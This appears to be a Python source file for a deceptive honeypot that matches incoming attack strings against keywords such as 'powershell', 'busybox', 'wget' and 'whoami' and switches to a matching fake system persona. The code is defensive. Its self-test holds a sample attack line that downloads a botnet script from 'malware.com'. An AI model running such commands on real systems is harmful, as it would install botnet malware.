import json
import os
import random

class PersonaManager:
    """
    Project Mimic: The Engine of Chameleon Teaming.
    Dynamically loads and switches system identity based on threat context.
    """
    
    def __init__(self, persona_dir="personas"):
        self.persona_dir = persona_dir
        self.personas = {}
        self.current_persona = None
        self.load_personas()

    def load_personas(self):
        """Loads all JSON skins from the directory."""
        if not os.path.exists(self.persona_dir):
            print(f"[!] Persona directory {self.persona_dir} not found.")
            return

        for filename in os.listdir(self.persona_dir):
            if filename.endswith(".json"):
                path = os.path.join(self.persona_dir, filename)
                try:
                    with open(path, 'r') as f:
                        data = json.load(f)
                        self.personas[data['id']] = data
                        print(f"[*] Loaded Persona: {data['name']}")
                except Exception as e:
                    print(f"[!] Failed to load {filename}: {e}")

    def set_persona(self, persona_id):
        """Manually force a specific skin."""
        if persona_id in self.personas:
            self.current_persona = self.personas[persona_id]
            print(f"[+] MIMIC SYSTEM ENGAGED: Switching to {self.current_persona['name']}")
            return self.current_persona
        else:
            print(f"[!] Persona ID {persona_id} not found.")
            return None

    def auto_select(self, attack_payload):
        """
        The Chameleon Logic:
        Analyzes the attack string and picks the best mask to deceive the attacker.
        """
        payload = attack_payload.lower()
        
        # If they look for Windows files -> Become a Bank
        if "win.ini" in payload or "powershell" in payload or "iis" in payload:
            return self.set_persona("persona_banking_01")
            
        # If they try Telnet/Busybox commands -> Become an IoT Camera
        elif "busybox" in payload or "wget" in payload or "arm7" in payload:
            return self.set_persona("persona_iot_cam_04")
            
        # If they look sophisticated -> Become the Ghost
        elif "whoami" in payload or "id" in payload or "ssh" in payload:
            return self.set_persona("persona_ghost_99")
            
        # Default -> Random confusion
        else:
            random_id = random.choice(list(self.personas.keys()))
            return self.set_persona(random_id)

# Quick Test
if __name__ == "__main__":
    pm = PersonaManager()
    print("\n--- Testing Chameleon Logic ---")
    pm.auto_select("GET /windows/system32/cmd.exe")
    pm.auto_select("wget http://malware.com/botnet.sh")
    pm.auto_select("ssh root@localhost")
